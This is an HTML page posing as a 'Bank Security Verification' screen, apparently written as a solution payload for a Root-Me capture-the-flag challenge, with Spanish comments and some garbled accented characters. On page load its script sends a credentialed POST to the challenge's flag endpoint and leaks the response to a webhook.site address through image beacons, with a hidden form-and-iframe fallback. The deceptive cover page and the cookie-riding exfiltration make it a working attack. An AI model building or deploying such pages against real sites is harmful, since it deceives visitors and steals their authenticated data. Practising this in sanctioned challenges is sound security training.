<!DOCTYPE html>
<html>
<head>
    <title>Bank Security Verification</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
        .container { background: white; padding: 30px; border-radius: 10px; margin: 0 auto; max-width: 500px; }
        .loading { color: green; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>游 Security Check</h1>
        <div class="loading" id="status">Initializing verification...</div>
    </div>

    <script>
        // Funci칩n mejorada que usa fetch en lugar de XMLHttpRequest s칤ncrono
        async function getFlag() {
            try {
                document.getElementById('status').textContent = "Checking permissions...";
                
                // Usar fetch en lugar de XMLHttpRequest s칤ncrono
                const response = await fetch('https://bankme-1.challenges.pro.root-me.org/flag', {
                    method: 'POST',
                    credentials: 'include', // Incluir cookies de sesi칩n
                    mode: 'cors',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    }
                });
                
                if (response.ok) {
                    const flag = await response.text();
                    document.getElementById('status').textContent = "Flag obtained! Sending...";
                    
                    // Enviar a webhook
                    const webhook = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
                    const img = new Image();
                    img.src = webhook + "?flag=" + encodeURIComponent(flag);
                    
                    document.getElementById('status').textContent = "Verification complete!";
                } else {
                    document.getElementById('status').textContent = "Permission denied";
                    // Enviar error al webhook
                    const webhook = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
                    const img = new Image();
                    img.src = webhook + "?error=Response_status:" + response.status;
                }
            } catch (error) {
                document.getElementById('status').textContent = "Error in verification";
                // Enviar error al webhook
                const webhook = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
                const img = new Image();
                img.src = webhook + "?error=" + encodeURIComponent(error.toString());
            }
        }

        // Versi칩n alternativa usando form submission (m치s compatible)
        function tryWithForm() {
            document.getElementById('status').textContent = "Trying alternative method...";
            
            // Crear un formulario invisible
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://bankme-1.challenges.pro.root-me.org/flag';
            form.target = 'hiddenFrame';
            form.style.display = 'none';
            
            // Crear iframe para recibir la respuesta
            const frame = document.createElement('iframe');
            frame.name = 'hiddenFrame';
            frame.style.display = 'none';
            frame.onload = function() {
                // Intentar leer la respuesta del iframe
                try {
                    const flag = frame.contentDocument.body.innerText;
                    const webhook = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
                    const img = new Image();
                    img.src = webhook + "?flag=" + encodeURIComponent(flag);
                    document.getElementById('status').textContent = "Success with form method!";
                } catch (e) {
                    const webhook = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
                    const img = new Image();
                    img.src = webhook + "?error=Form_method_failed";
                }
            };
            
            document.body.appendChild(frame);
            document.body.appendChild(form);
            form.submit();
        }

        // Ejecutar cuando cargue la p치gina
        window.addEventListener('load', function() {
            // Primero intentar con fetch
            getFlag().catch(() => {
                // Si fetch falla, intentar con form
                setTimeout(tryWithForm, 1000);
            });
        });
    </script>
</body>
</html>
